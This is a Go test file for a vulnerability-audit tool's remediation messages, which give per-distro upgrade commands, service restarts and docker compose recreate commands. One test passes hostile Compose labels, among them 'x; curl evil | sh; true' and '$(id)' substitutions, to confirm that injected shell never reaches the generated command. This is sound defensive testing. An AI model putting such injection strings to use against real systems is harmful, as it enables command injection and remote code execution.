package audit

import (
	"slices"
	"testing"

	"github.com/klar-web-services/tripcoil/internal/inventory"
	"github.com/klar-web-services/tripcoil/internal/osrel"
)

const (
	libsslID = "pkg:deb/debian/libssl3@3.0.15-1~deb12u1?arch=amd64&distro=debian-12"
	kernelID = "pkg:deb/debian/linux-image-6.1.0-28-amd64@6.1.119-1?arch=amd64&distro=debian-12"
	apiID    = "binary:9f2c41d0"
	imageID  = "image:sha256:1111"
)

func remediationInventory() *inventory.Inventory {
	return &inventory.Inventory{
		Items: []inventory.Item{
			{ID: "kernel", Kind: inventory.KindKernel, RunningVersion: "6.1.119-1", Origins: []string{kernelID}},
			{ID: "proc:nginx", Kind: inventory.KindProcess, Name: "nginx", Units: []string{"nginx.service"}, Origins: []string{libsslID}},
			{ID: "proc:php", Kind: inventory.KindProcess, Name: "php-fpm8.2", Units: []string{"php8.2-fpm.service"}, Origins: []string{libsslID}},
			{ID: "proc:shop", Kind: inventory.KindProcess, Name: "node", Units: []string{"shop.service"}, Origins: []string{libsslID, "appdir:/srv/shop"}},
			{ID: "proc:api", Kind: inventory.KindProcess, Name: "api", Units: []string{"user@1000.service"}, Origins: []string{apiID, libsslID}},
			{ID: "container:shop-web-1", Kind: inventory.KindContainer, Name: "shop-web-1", Compose: &inventory.Compose{Project: "shop", Service: "web", WorkingDir: "/srv/shop", ConfigFiles: []string{"/srv/shop/compose.yml"}}, Origins: []string{imageID}},
			{ID: "container:cache", Kind: inventory.KindContainer, Name: "cache", Origins: []string{imageID}},
		},
		Origins: []inventory.Origin{
			{ID: libsslID, Kind: inventory.OriginPackage, Name: "libssl3", Version: "3.0.15-1~deb12u1", RunningOlderCopy: true},
			{ID: kernelID, Kind: inventory.OriginPackage, Name: "linux-image-6.1.0-28-amd64", Version: "6.1.119-1"},
			{ID: apiID, Kind: inventory.OriginBinary, Paths: []string{"/opt/api/api"}},
			{ID: "appdir:/srv/shop", Kind: inventory.OriginAppDir, Path: "/srv/shop"},
			{ID: imageID, Kind: inventory.OriginImage, ImageID: "sha256:1111", Ref: "ghcr.io/acme/shop:2026.11.3"},
		},
	}
}

func TestRemediation(t *testing.T) {
	r := newRemediation(osrel.Debian, remediationInventory())
	f := func(origin, pkg, version, state string, fixes ...string) Finding {
		return Finding{Origin: origin, Package: Package{Name: pkg, Version: version}, Fix: Fix{State: state, Versions: fixes}}
	}
	cases := []struct {
		name string
		f    Finding
		want string
	}{
		{"package, with its units, and a running older copy", f(libsslID, "libssl3", "3.0.15-1~deb12u1", "fixed", "3.0.16-1~deb12u1"),
			"Upgrade libssl3 to 3.0.16-1~deb12u1 (apt-get update && apt-get install --only-upgrade libssl3), then restart nginx.service, php8.2-fpm.service, shop.service, api. Some of its processes still run an older copy from before the last upgrade; restart them either way."},
		{"no fix known", f(libsslID, "libssl3", "3.0.15-1~deb12u1", "not-fixed"), "No fix is known for libssl3 3.0.15-1~deb12u1 yet."},
		{"fixed without a version is no fix", f(libsslID, "libssl3", "3.0.15-1~deb12u1", "fixed"), "No fix is known for libssl3 3.0.15-1~deb12u1 yet."},
		{"wont-fix", f(libsslID, "libssl3", "3.0.15-1~deb12u1", "wont-fix"), "No fix will be released for libssl3 3.0.15-1~deb12u1 (wont-fix)."},
		{"kernel package", f(kernelID, "linux-image-6.1.0-28-amd64", "6.1.119-1", "fixed", "6.1.123-1"),
			"Upgrade the kernel to 6.1.123-1 or later (apt-get update && apt-get dist-upgrade), then reboot."},
		{"kernel without a fix", f(kernelID, "linux-image-6.1.0-28-amd64", "6.1.119-1", "not-fixed"), "No fixed kernel version is known yet."},
		{"kernel, wont-fix", f(kernelID, "linux-image-6.1.0-28-amd64", "6.1.119-1", "wont-fix"), "No fix will be released for this kernel (wont-fix)."},
		{"binary", f(apiID, "golang.org/x/net", "v0.1.0", "fixed", "v0.17.0"), "Replace or rebuild /opt/api/api with golang.org/x/net v0.17.0 or later, then restart api."},
		{"app directory, several fix versions", f("appdir:/srv/shop", "minimist", "1.2.5", "fixed", "0.2.4", "1.2.6"), "Upgrade minimist in /srv/shop to 0.2.4 or 1.2.6, then restart shop.service."},
		{"image, with and without Compose", f(imageID, "libssl3", "3.0.11-1~deb12u2", "fixed", "3.0.16-1~deb12u1"),
			"Rebuild ghcr.io/acme/shop:2026.11.3 or pull a newer image with libssl3 3.0.16-1~deb12u1 or later, then recreate the containers cache, shop-web-1 (docker compose -p shop --project-directory /srv/shop -f /srv/shop/compose.yml up -d --force-recreate --no-deps web)."},
	}
	for _, c := range cases {
		if got := r.line(c.f); got != c.want {
			t.Errorf("%s:\n got %s\nwant %s", c.name, got, c.want)
		}
	}
	if ids := r.itemIDs(imageID); !slices.Equal(ids, []string{"container:shop-web-1", "container:cache"}) {
		t.Errorf("items %v", ids)
	}
}

func TestRemediationKernelUpstreamAndArch(t *testing.T) {
	up := inventory.KernelUpstreamOriginID("7.3.3")
	inv := &inventory.Inventory{
		Items:   []inventory.Item{{ID: "kernel", Kind: inventory.KindKernel, Release: "7.3.3-1-cachyos", RunningVersion: "7.3.3-1", Origins: []string{up}}, {ID: "proc:sshd", Kind: inventory.KindProcess, Name: "sshd", Units: []string{"sshd.service"}, Origins: []string{"pkg:alpm/cachyos/openssl@3.6.0-1?arch=x86_64&distro=cachyos"}}},
		Origins: []inventory.Origin{{ID: up, Kind: inventory.OriginKernelUpstream, UpstreamVersion: "7.3.3"}, {ID: "pkg:alpm/cachyos/openssl@3.6.0-1?arch=x86_64&distro=cachyos", Kind: inventory.OriginPackage, Name: "openssl"}},
	}
	r := newRemediation(osrel.Arch, inv)
	if got, want := r.line(Finding{Origin: up, Fix: Fix{State: "fixed", Versions: []string{"7.3.5"}}}), "Upgrade the kernel to Linux 7.3.5 or later (pacman -Syu), then reboot."; got != want {
		t.Errorf("got %s\nwant %s", got, want)
	}
	if got, want := r.line(Finding{Origin: "pkg:alpm/cachyos/openssl@3.6.0-1?arch=x86_64&distro=cachyos", Package: Package{Name: "openssl"}, Fix: Fix{State: "fixed", Versions: []string{"3.6.1-1"}}}), "Upgrade openssl to 3.6.1-1 (pacman -Syu), then restart sshd.service."; got != want {
		t.Errorf("got %s\nwant %s", got, want)
	}
	// A custom kernel without a package is not upgraded with the package tool. Its running version
	// is the release itself.
	inv.Items[0].RunningVersion = inv.Items[0].Release
	r = newRemediation(osrel.Arch, inv)
	if got, want := r.line(Finding{Origin: up, Fix: Fix{State: "fixed", Versions: []string{"7.3.5"}}}), "Upgrade the kernel to Linux 7.3.5 or later, then reboot."; got != want {
		t.Errorf("got %s\nwant %s", got, want)
	}
}

// The Compose labels can come from the image, so a name that breaks Compose's rules never reaches
// the command, and the container is only named.
func TestRemediationComposeUntrusted(t *testing.T) {
	files := []string{"/srv/shop/compose.yml"}
	cases := []struct {
		name string
		c    inventory.Compose
		want string
	}{
		{"shell in the project", inventory.Compose{Project: "x; curl evil | sh; true", Service: "web", ConfigFiles: files}, "the container app"},
		{"upper case project", inventory.Compose{Project: "Shop", Service: "web", ConfigFiles: files}, "the container app"},
		{"project starts with a dash", inventory.Compose{Project: "-shop", Service: "web", ConfigFiles: files}, "the container app"},
		{"shell in the service", inventory.Compose{Project: "shop", Service: "web$(id)", ConfigFiles: files}, "the container app"},
		{"service starts with a dot", inventory.Compose{Project: "shop", Service: ".web", ConfigFiles: files}, "the container app"},
		{"no service", inventory.Compose{Project: "shop", ConfigFiles: files}, "the container app"},
		{"no directory and no compose files", inventory.Compose{Project: "shop", Service: "web"}, "the container app"},
		{"no compose files", inventory.Compose{Project: "shop", Service: "web", WorkingDir: "/srv/shop"}, "the container app"},
		{"no directory", inventory.Compose{Project: "shop_2", Service: "Web.1", ConfigFiles: files},
			"the container app (docker compose -p shop_2 -f /srv/shop/compose.yml up -d --force-recreate --no-deps Web.1)"},
		{"directory with a space", inventory.Compose{Project: "shop", Service: "web", WorkingDir: "/srv/my shop", ConfigFiles: files}, "the container app"},
		{"relative directory", inventory.Compose{Project: "shop", Service: "web", WorkingDir: "srv/shop", ConfigFiles: files}, "the container app"},
		{"directory with shell", inventory.Compose{Project: "shop", Service: "web", WorkingDir: "/srv/$(id)", ConfigFiles: files}, "the container app"},
		{"plain directory", inventory.Compose{Project: "shop", Service: "web", WorkingDir: "/srv/shop-2.0/c++_x", ConfigFiles: []string{"/srv/shop-2.0/c++_x/compose.yml"}},
			"the container app (docker compose -p shop --project-directory /srv/shop-2.0/c++_x -f /srv/shop-2.0/c++_x/compose.yml up -d --force-recreate --no-deps web)"},
		{"compose files", inventory.Compose{Project: "shop", Service: "web", WorkingDir: "/srv/shop", ConfigFiles: []string{"/srv/shop/compose.yml", "/srv/shop/compose.prod.yml"}},
			"the container app (docker compose -p shop --project-directory /srv/shop -f /srv/shop/compose.yml -f /srv/shop/compose.prod.yml up -d --force-recreate --no-deps web)"},
		{"compose file with shell", inventory.Compose{Project: "shop", Service: "web", WorkingDir: "/srv/shop", ConfigFiles: []string{"/srv/shop/compose.yml", "/srv/shop/$(id).yml"}}, "the container app"},
		{"relative compose file", inventory.Compose{Project: "shop", Service: "web", WorkingDir: "/srv/shop", ConfigFiles: []string{"compose.yml"}}, "the container app"},
	}
	for _, c := range cases {
		inv := &inventory.Inventory{
			Items:   []inventory.Item{{ID: "container:app", Kind: inventory.KindContainer, Name: "app", Compose: &c.c, Origins: []string{imageID}}},
			Origins: []inventory.Origin{{ID: imageID, Kind: inventory.OriginImage, Ref: "app:1"}},
		}
		got := newRemediation(osrel.Debian, inv).line(Finding{Origin: imageID, Package: Package{Name: "zlib"}, Fix: Fix{State: "fixed", Versions: []string{"1.3.1"}}})
		if want := "Rebuild app:1 or pull a newer image with zlib 1.3.1 or later, then recreate " + c.want + "."; got != want {
			t.Errorf("%s:\n got %s\nwant %s", c.name, got, want)
		}
	}
}

func TestRemediationNamesAtMostFive(t *testing.T) {
	inv := &inventory.Inventory{Origins: []inventory.Origin{{ID: libsslID, Kind: inventory.OriginPackage}}}
	for _, u := range []string{"a", "b", "c", "d", "e", "f", "g"} {
		inv.Items = append(inv.Items, inventory.Item{ID: "proc:" + u, Kind: inventory.KindProcess, Name: u, Units: []string{u + ".service"}, Origins: []string{libsslID}})
	}
	got := newRemediation(osrel.Debian, inv).line(Finding{Origin: libsslID, Package: Package{Name: "libssl3"}, Fix: Fix{State: "fixed", Versions: []string{"2"}}})
	if want := "Upgrade libssl3 to 2 (apt-get update && apt-get install --only-upgrade libssl3), then restart a.service, b.service, c.service, d.service, e.service and 2 more."; got != want {
		t.Errorf("got %s\nwant %s", got, want)
	}
}

func TestRemediationCommands(t *testing.T) {
	cases := []struct {
		family          osrel.Family
		version         string
		upgrade, system string
	}{
		{osrel.Debian, "12", "apt-get update && apt-get install --only-upgrade openssl", "apt-get update && apt-get dist-upgrade"},
		{osrel.Ubuntu, "24.04", "apt-get update && apt-get install --only-upgrade openssl", "apt-get update && apt-get dist-upgrade"},
		{osrel.RHEL, "9.5", "yum update openssl", "yum update"},
		{osrel.Fedora, "41", "dnf upgrade openssl", "dnf upgrade"},
		{osrel.Amazon, "2", "yum update openssl", "yum update"},
		{osrel.Amazon, "2023", "dnf upgrade --releasever=latest openssl", "dnf upgrade --releasever=latest"},
		{osrel.SUSE, "15.6", "zypper update openssl", "zypper update"},
		{osrel.Alpine, "3.20.3", "apk upgrade -U openssl", "apk upgrade -U"},
		{osrel.Arch, "", "pacman -Syu", "pacman -Syu"},
	}
	for _, c := range cases {
		inv := &inventory.Inventory{
			Host:    inventory.Host{Distro: inventory.Distro{VersionID: c.version}},
			Items:   []inventory.Item{{ID: "kernel", Kind: inventory.KindKernel, Origins: []string{kernelID}}},
			Origins: []inventory.Origin{{ID: libsslID, Kind: inventory.OriginPackage}, {ID: kernelID, Kind: inventory.OriginPackage}},
		}
		r := newRemediation(c.family, inv)
		if got, want := r.line(Finding{Origin: libsslID, Package: Package{Name: "openssl"}, Fix: Fix{State: "fixed", Versions: []string{"2"}}}), "Upgrade openssl to 2 ("+c.upgrade+")."; got != want {
			t.Errorf("%s %s:\n got %s\nwant %s", c.family, c.version, got, want)
		}
		if got, want := r.line(Finding{Origin: kernelID, Fix: Fix{State: "fixed", Versions: []string{"6.1.123-1"}}}), "Upgrade the kernel to 6.1.123-1 or later ("+c.system+"), then reboot."; got != want {
			t.Errorf("%s %s:\n got %s\nwant %s", c.family, c.version, got, want)
		}
	}
}

// PID 1 is only told to re-execute itself when it is systemd; another init is named.
func TestRemediationRestartsPID1(t *testing.T) {
	cases := []struct {
		name    string
		family  osrel.Family
		init    string
		pid1    string
		pids    []int
		upgrade string
		restart string
	}{
		{"systemd with user managers", osrel.Fedora, "systemd", "systemd", []int{1, 1201}, "dnf upgrade openssl",
			"sshd, systemd (systemctl daemon-reexec; for each user manager: systemctl --user -M <user>@ daemon-reexec)"},
		{"systemd alone", osrel.Fedora, "systemd", "systemd", []int{1}, "dnf upgrade openssl", "sshd, systemd (systemctl daemon-reexec)"},
		{"systemd, init unknown", osrel.Fedora, "unknown", "systemd", []int{1}, "dnf upgrade openssl", "sshd, systemd (systemctl daemon-reexec)"},
		{"systemd under another name", osrel.Fedora, "systemd", "init", []int{1}, "dnf upgrade openssl", "sshd, systemd (systemctl daemon-reexec)"},
		{"alpine's busybox", osrel.Alpine, "openrc", "busybox", []int{1, 2010, 2105}, "apk upgrade -U openssl", "busybox, sshd"},
		{"openrc-init", osrel.Alpine, "openrc", "openrc-init", []int{1}, "apk upgrade -U openssl", "openrc-init, sshd"},
	}
	for _, c := range cases {
		var procs []inventory.Process
		for _, pid := range c.pids {
			procs = append(procs, inventory.Process{PID: pid})
		}
		inv := &inventory.Inventory{
			Host: inventory.Host{Init: c.init},
			Items: []inventory.Item{
				{ID: "proc:init", Kind: inventory.KindProcess, Name: c.pid1, Processes: procs, Origins: []string{libsslID}},
				{ID: "proc:sshd", Kind: inventory.KindProcess, Name: "sshd", Processes: []inventory.Process{{PID: 610}}, Origins: []string{libsslID}},
			},
			Origins: []inventory.Origin{{ID: libsslID, Kind: inventory.OriginPackage}},
		}
		got := newRemediation(c.family, inv).line(Finding{Origin: libsslID, Package: Package{Name: "openssl"}, Fix: Fix{State: "fixed", Versions: []string{"3.5.4"}}})
		if want := "Upgrade openssl to 3.5.4 (" + c.upgrade + "), then restart " + c.restart + "."; got != want {
			t.Errorf("%s:\n got %s\nwant %s", c.name, got, want)
		}
	}
}
